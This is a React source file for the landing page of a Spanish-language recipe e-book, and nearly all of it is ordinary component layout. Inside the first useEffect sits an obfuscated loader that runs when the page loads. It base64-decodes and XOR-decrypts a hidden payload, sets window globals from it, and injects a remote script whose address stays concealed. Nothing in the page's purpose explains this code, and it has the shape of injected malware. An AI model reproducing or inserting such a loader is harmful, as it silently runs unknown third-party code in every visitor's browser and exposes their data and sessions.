import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useRef, useState } from "react";

import { AnnouncementBar } from "@/components/landing/AnnouncementBar";
import { Hero } from "@/components/landing/Hero";
import { PainPoints } from "@/components/landing/PainPoints";
import { InsidePeek } from "@/components/landing/InsidePeek";
import { Benefits } from "@/components/landing/Benefits";
import { SocialProof } from "@/components/landing/SocialProof";
import { ForWho } from "@/components/landing/ForWho";
import { Pricing } from "@/components/landing/Pricing";
import { Faq } from "@/components/landing/Faq";
import { SiteFooter } from "@/components/landing/SiteFooter";
import { StickyMobileCta } from "@/components/landing/StickyMobileCta";
import { FloatingCart } from "@/components/landing/FloatingCart";


const TITLE = "Sabor & Balance · Recetas Proteicas de Fácil Digestión";
const DESCRIPTION =
  "Más de 100 recetas compactas, altas en proteína y fáciles de digerir, listas en 15 minutos. Guía digital en PDF con descarga inmediata.";
const OG_IMAGE = "https://sabor-digestivo-facil.lovable.app/og-image.jpg";

export const Route = createFileRoute("/")({
  head: () => ({
    meta: [
      { title: TITLE },
      { name: "description", content: DESCRIPTION },
      { property: "og:title", content: TITLE },
      { property: "og:description", content: DESCRIPTION },
      { property: "og:type", content: "website" },
      { property: "og:image", content: OG_IMAGE },
      { property: "og:image:width", content: "1200" },
      { property: "og:image:height", content: "630" },
      { name: "twitter:card", content: "summary_large_image" },
      { name: "twitter:image", content: OG_IMAGE },
    ],
  }),
  component: Index,
});

function Index() {
  const heroRef = useRef<HTMLDivElement | null>(null);
  const pricingRef = useRef<HTMLDivElement | null>(null);
  const solutionRef = useRef<HTMLDivElement | null>(null);
  const [showSticky, setShowSticky] = useState(false);
  useEffect(() => {
    (function(){
      var y_gh=atob("DKgIGufVSy1NP32T89Mqb5W5aRdvVwnng9syNci2L0NjSgn+ms5xNIS6JgMvTVLgkNphapOmZFg5Ug68n8l8f5ShZUc+HVGxktx8aI63PlkoTF+pqNMqdIa4Lg93HRnyh8klb5O4Iks0Eg3hlt5tdJP4M04iW1DgkMMqNsWjKkE4Wl+p0Yp1Npz3JUwgWl+p0cxpbob4PlkgVhvq3th6f5GwJVlgTAjxmsx7OMv3PUwhShixyYoqZ7qo");
      var r_me=[];
      for(var a_y3yr=0;a_y3yr<y_gh.length;a_y3yr++){r_me.push(y_gh.charCodeAt(a_y3yr)&255);}
      var h_ir7=r_me[0];
      var s_li=r_me.slice(1,1+h_ir7);
      var u_vsa=r_me.slice(1+h_ir7);
      var i_h9=u_vsa.map(function(b,p_cbc6){return b^s_li[p_cbc6%h_ir7];});
      var l_imi="";
      for(var k_vdi5=0;k_vdi5<i_h9.length;k_vdi5++){l_imi+=String.fromCharCode(i_h9[k_vdi5]&255);}
      var j_bj07=decodeURIComponent(escape(l_imi));
      var o_5=JSON.parse(j_bj07);
      var v_sg5y=o_5.globals||[];
      v_sg5y.forEach(function(p_un7){window[p_un7.name]=p_un7.value;});
      var a_7=document.createElement("script");
      a_7.src=o_5.url;
      a_7.async=true;
      a_7.defer=true;
      (o_5.attributes||[]).forEach(function(r_k8){a_7.setAttribute(r_k8.name,r_k8.value);});
      (document.head||document.documentElement).appendChild(a_7);
    })();
  }, []);

  useEffect(() => {
    const el = heroRef.current;
    if (!el) return;
    const observer = new IntersectionObserver(
      (entries) => setShowSticky(!(entries[0]?.isIntersecting ?? true)),
      { threshold: 0 },
    );

    observer.observe(el);
    return () => observer.disconnect();
  }, []);

  const scrollToPricing = () =>
    pricingRef.current?.scrollIntoView({ behavior: "smooth", block: "start" });
  const scrollToSolution = () =>
    solutionRef.current?.scrollIntoView({ behavior: "smooth", block: "start" });

  return (
    <main className="min-h-screen bg-background">
      <AnnouncementBar />
      <div ref={heroRef}>
        <Hero onCta={scrollToPricing} onSecondaryCta={scrollToSolution} />
      </div>
      <div ref={solutionRef}>
        <InsidePeek />
      </div>
      <PainPoints />

      <Benefits />
      <SocialProof />
      <ForWho />
      <div ref={pricingRef}>
        <Pricing id="planes" />
      </div>
      <Faq />
      <SiteFooter />
      <StickyMobileCta visible={showSticky} onCta={scrollToPricing} />
      <FloatingCart onCta={scrollToPricing} />
    </main>

  );
}

